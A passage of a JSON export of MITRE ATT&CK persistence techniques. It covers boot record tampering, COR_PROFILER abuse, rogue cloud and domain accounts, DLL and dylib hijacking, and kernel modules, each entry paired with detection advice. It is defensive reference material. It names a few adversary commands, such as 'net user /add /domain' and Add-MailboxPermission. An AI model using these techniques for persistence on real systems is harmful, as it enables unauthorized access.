2011)<\/p>\n<p>The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":522,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":522,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":525,"name":"T1574.012 - COR_PROFILER","sort_id":0,"external_id":"T1574.012","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)<\/p>\n<p>The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1559\/001\">Component Object Model<\/a> (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)<\/p>\n<p>Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1548\/002\">Bypass User Access Control<\/a>) if the victim .NET process executes at a higher permission level, as well as to hook and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1562\">Impair Defenses<\/a> provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https:\/\/attack.mitre.org\/software\/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":525,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":531,"name":"T1136.003 - Cloud Account","sort_id":0,"external_id":"T1136.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)<\/p>\n<p>Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":531,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":531,"platform_id":5,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":531,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":531,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":531,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":539,"name":"T1542.002 - Component Firmware","sort_id":0,"external_id":"T1542.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1542\/001\">System Firmware<\/a> but conducted upon other system components\/devices that may not have the same capability or level of integrity checking.<\/p>\n<p>Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Data and telemetry from use of device drivers (i.e. processes and API calls) and\/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) (Citation: SanDisk SMART) (Citation: SmartMontools) disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\n\nDisk check and forensic utilities (Citation: ITWorld Hard Disk Health Dec 2014) may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":539,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":542,"name":"T1554 - Compromise Client Software Binary","sort_id":0,"external_id":"T1554","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.<\/p>\n<p>Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads\/writes, or network connections.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":542,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":542,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":542,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":551,"name":"T1543 - Create or Modify System Process","sort_id":0,"external_id":"T1543","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. (Citation: TechNet Services) On macOS, launchd processes known as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/004\">Launch Daemon<\/a> and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1543\/001\">Launch Agent<\/a> are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) <\/p>\n<p>Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  <\/p>\n<p>Services, daemons, or agents may be created with administrator privileges but executed under root\/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. (Citation: OSX Malware Detection).  <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":551,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":551,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":551,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":560,"name":"T1574.001 - DLL Search Order Hijacking","sort_id":0,"external_id":"T1574.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and\/or evading restrictions on file execution.<\/p>\n<p>There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)<\/p>\n<p>Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL. (Citation: Microsoft Dynamic-Link Library Redirection) (Citation: Microsoft Manifests) (Citation: FireEye DLL Search Order Hijacking)<\/p>\n<p>If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":560,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":561,"name":"T1574.002 - DLL Side-Loading","sort_id":0,"external_id":"T1574.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.<\/p>\n<p>Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)<\/p>\n<p>Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":561,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":577,"name":"T1136.002 - Domain Account","sort_id":0,"external_id":"T1136.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user \/add \/domain<\/code> command can be used to create a domain account.<\/p>\n<p>Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user \/add \/domain<\/code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":577,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":577,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":577,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":584,"name":"T1574.004 - Dylib Hijacking","sort_id":0,"external_id":"T1574.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.<\/p>\n<p>A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)<\/p>\n<p>If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Objective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. ","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":584,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":595,"name":"T1098.002 - Exchange Email Delegate Permissions","sort_id":0,"external_id":"T1098.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <code>Add-MailboxPermission<\/code> <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018)<\/p>\n<p>This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1534\">Internal Spearphishing<\/a>), so the messages evade spam\/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\nA larger than normal volume of emails sent from an account and similar phishing emails sent from \u202freal accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":595,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":595,"platform_id":4,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":596,"name":"T1574.005 - Executable Installer File Permissions Weakness","sort_id":0,"external_id":"T1574.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.<\/p>\n<p>Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%<\/code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\/001\">DLL Search Order Hijacking<\/a>.<\/p>\n<p>Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1548\/002\">Bypass User Access Control<\/a>. Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and\/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":596,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":621,"name":"T1574 - Hijack Execution Flow","sort_id":0,"external_id":"T1574","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.<\/p>\n<p>There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs\/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and\/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":621,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":621,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":621,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":635,"name":"T1547.006 - Kernel Modules and Extensions","sort_id":0,"external_id":"T1547.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0<\/p>\n<p>When used maliciously, LKMs can be a type of kernel-mode <a href=\"https:\/\/attack.mitre.org\/techniques\/T1014\">Rootkit<\/a> that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)<\/p>\n<p>Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload<\/code> and <code>kextunload<\/code> commands.<\/p>\n<p>Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir) (Citation: Trend Micro Skidmap)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:<code>modprobe<\/code>, <code>insmod<\/code>, <code>lsmod<\/code>, <code>rmmod<\/code>, or <code>modinfo<\/code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>\/lib\/modules<\/code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)\n\nFor macOS, monitor for execution of <code>kextload<\/code> commands and correlate with other unknown or suspicious activity.\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and\/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly.\u00a0These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)<\/code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)<\/code>","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":635,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":635,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":639,"name":"T1574.006 - LD_PRELOAD","sort_id":0,"external_id":"T1574.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check 